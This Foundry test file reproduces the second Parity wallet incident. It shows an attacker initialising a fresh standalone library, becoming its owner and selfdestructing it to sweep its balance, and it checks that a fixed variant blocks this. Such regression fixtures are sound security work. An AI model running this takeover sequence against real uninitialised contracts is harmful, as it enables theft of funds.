// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ParityWalletBug2} from "../src/ParityWalletBug2.sol";
import {ParityWalletBug2Fixed} from "../src/ParityWalletBug2Fixed.sol";

// Differential fixture for the second Parity incident (SWC-106).
// The library is deployed standalone. Its `initWallet` is guarded only by
// `only_uninitialized`, which is true on a fresh deployment, so anyone can
// claim ownership and then `kill` (selfdestruct) it. The fixed variant marks
// the library as already initialised in its constructor.
contract ParityWalletBug2FixtureTest is Test {
    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
    }

    function test_fixtureReproduces() public {
        ParityWalletBug2 lib = new ParityWalletBug2();
        vm.deal(address(lib), 1 ether);
        assertFalse(lib.isOwner(attacker), "fresh library: attacker is not an owner");

        // only_uninitialized is satisfied on a fresh library, so anyone can init.
        vm.prank(attacker);
        lib.initWallet(new address[](0), 1, 0);
        assertTrue(lib.isOwner(attacker), "attacker took over the standalone library");

        // As sole owner the attacker selfdestructs the library, sweeping its balance.
        vm.prank(attacker);
        lib.kill(attacker);
        assertEq(attacker.balance, 1 ether, "attacker swept the library balance via kill()");
        assertEq(address(lib).balance, 0, "library emptied");
    }

    function test_fixtureDoesNotReproduce() public {
        ParityWalletBug2Fixed lib = new ParityWalletBug2Fixed();
        vm.deal(address(lib), 1 ether);

        // The constructor already set m_numOwners = 1, so initWallet reverts.
        vm.prank(attacker);
        vm.expectRevert();
        lib.initWallet(new address[](0), 1, 0);
        assertFalse(lib.isOwner(attacker), "library already initialised: takeover blocked");

        // With no owners, kill's onlymanyowners check is never satisfied.
        vm.prank(attacker);
        lib.kill(attacker);
        assertEq(address(lib).balance, 1 ether, "balance untouched");
        assertEq(attacker.balance, 0, "attacker got nothing");
    }
}
